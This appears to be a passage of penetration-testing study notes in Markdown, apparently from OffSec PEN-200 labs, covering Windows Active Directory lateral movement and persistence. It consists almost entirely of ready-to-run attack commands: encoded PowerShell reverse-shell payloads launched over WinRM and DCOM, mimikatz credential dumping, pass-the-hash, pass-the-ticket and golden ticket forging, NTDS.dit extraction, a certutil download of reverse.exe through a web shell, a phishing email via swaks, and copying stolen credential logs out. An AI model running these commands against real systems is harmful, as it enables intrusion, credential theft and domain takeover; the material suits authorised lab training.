	New-PSSession -ComputerName 192.168.50.73 -Credential $credential
	Enter-PSSession 1
	whoami
	hostname
	
`C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD... HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`

<!-- TOC --><a name="psexec"></a>
## PsExec 
> Three requisites must be met. First, the user that authenticates to the target machine needs to be part of the Administrators local group. Second, the ADMIN$ share must be available, and third, File and Printer Sharing has to be turned on

`PS C:\> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd`

<!-- TOC --><a name="pass-the-hash"></a>
## Pass the Hash
> First, it requires an SMB connection through the firewall (commonly port 445), and second, the Windows File and Printer Sharing feature to be enabled. These requirements are common in internal enterprise environments.

`kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`

<!-- TOC --><a name="overpass-the-hash"></a>
## Overpass the Hash

	mimikatz #privilege::debug
	mimikatz #sekurlsa::logonpasswords
	mimikatz #sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

`PS C:\Windows\system32> klist`

`C:\> net use \\files04`

`C:\> klist`

`PS C:\> .\PsExec.exe \\files04 cmd`

<!-- TOC --><a name="pass-the-ticket"></a>
## Pass the Ticket
`PS C:\Windows\system32> whoami`
	
	corp\jen
`PS C:\Windows\system32> ls \\web04\backup`
	
	ls : Access to the path '\\web04\backup' is denied.

	mimikatz #privilege::debug
	mimikatz #sekurlsa::tickets /export

`PS C:\Tools> dir *.kirbi`

	mimikatz #kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
	mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
	
`PS C:\Tools> klist`

`PS C:\Tools> ls \\web04\backup`

<!-- TOC --><a name="dcom"></a>
## DCOM
>this method allows the execution of any shell command as long as the authenticated user is authorize
>
	$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
	$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
	$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
	AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")

<!-- TOC --><a name="golden-ticket"></a>
## Golden Ticket

`C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe`

	PsExec v2.4 - Execute processes remotely
	Copyright (C) 2001-2022 Mark Russinovich
	Sysinternals - www.sysinternals.com
	
	Couldn't access DC1:
	Access is denied.
	
	mimikatz # privilege::debug
	mimikatz # lsadump::lsa /patch
	Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
	
	RID  : 000001f4 (500)
	User : Administrator
	LM   :
	NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
	
	RID  : 000001f5 (501)
	User : Guest
	LM   :
	NTLM :
	
	RID  : 000001f6 (502)
	User : krbtgt
	LM   :
	NTLM : 1693c6cefafffc7af11ef34d1c788f47

.

	mimikatz # kerberos::purge
	mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
	mimikatz # misc::cmd

`C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe`

`C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe`
<!-- TOC --><a name="shadow-copies"></a>
## Shadow Copies
> from DC

`C:\Tools>vshadow.exe -nw -p  C:`

`C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`

`C:\> reg.exe save hklm\system c:\system.bak`

`kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`

<!-- TOC --><a name="miscelanea"></a>
# Miscelanea
<!-- TOC --><a name="linux-spawning-shell"></a>
## Linux spawning shell
`$ python3 -c 'import pty; pty.spawn("/bin/bash")'`

<!-- TOC --><a name="password-spraying"></a>
## Password Spraying
[https://www.netexec.wiki/](https://www.netexec.wiki/)

<!-- TOC --><a name="dump-git-branches"></a>
## Dump git branches
[https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)

`kali@kali:~$ /home/kali/.local/bin/git-dumper http://192.168.202.144/.git/ .`

<!-- TOC --><a name="reverse-shell-using-certutil"></a>
## Reverse shell using certutil
`kali@kali:~$ curl -u offsec:elite "http://192.168.212.46:242/shell.php?cmd=certutil+-f+-urlcache+http://192.168.45.248/reverse.exe+reverse.exe"`

<!-- TOC --><a name="send-email"></a>
## Send email
`kali@kali:~$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt - -header "Subject: Staging Script" --suppress-data -ap`

<!-- TOC --><a name="transfer-files"></a>
## Transfer files
<!-- TOC --><a name="smb"></a>
### SMB
On Kali:
`kali@kali:~$ impacket-smbserver test . -smb2support  -username kourosh -password kourosh`

On Windows:
`C:\> net use m: \\Kali_IP\test /user:kourosh kourosh
copy mimikatz.log m:\`

<!-- TOC --><a name="rdp-mounting-shared-folder"></a>
### RDP mounting shared folder
Using xfreerdp:
On Kali:
`kali@kali:~$ xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-200`

On windows:
`C:\> copy mimikatz.log \\tsclient\test\mimikatz.log`

<!-- TOC --><a name="using-rdesktop"></a>
### Using rdesktop
On Kali: 
`kali@kali:~$ rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200`

On Windows:
`C:\> copy mimikatz.log \\tsclient\test\mimikatz.log`

<!-- TOC --><a name="impacket-tools"></a>
### Impacket tools
>psexec and wmiexec are shipped with built in feature for file transfer.
Note: By default whether you upload (lput) or download (lget) a file, it'll be writte in C:\Windows path.
Uploading mimikatz.exe to the target machine:

`C:\Windows\system32> lput mimikatz.exe`

	[*] Uploading mimikatz.exe to ADMIN$\/
	
`C:\Windows\system32> cd C:\windows`
`C:\Windows> dir /b mimikatz.exe`

Downloading mimikatz.log:
`C:\Windows> lget mimikatz.log`

	[*] Downloading ADMIN$\mimikatz.log

<!-- TOC --><a name="evil-winrm"></a>
### Evil-winrm
Uploading files:
`upload mimikatz.exe C:\windows\tasks\mimikatz.exe`

Downloading files:
`download mimikatz.log /home/kali/Documents/pen-200`

<!-- TOC --><a name="c2-frameworks"></a>
### C2 frameworks
> Almost any of the C2 frameworks such as Metasploit are shipped with downloading and uploading functionality.

<!-- TOC --><a name="ftp"></a>
### FTP
Binaries in ASCII mode will make the file not executable. Set the mode to binary.
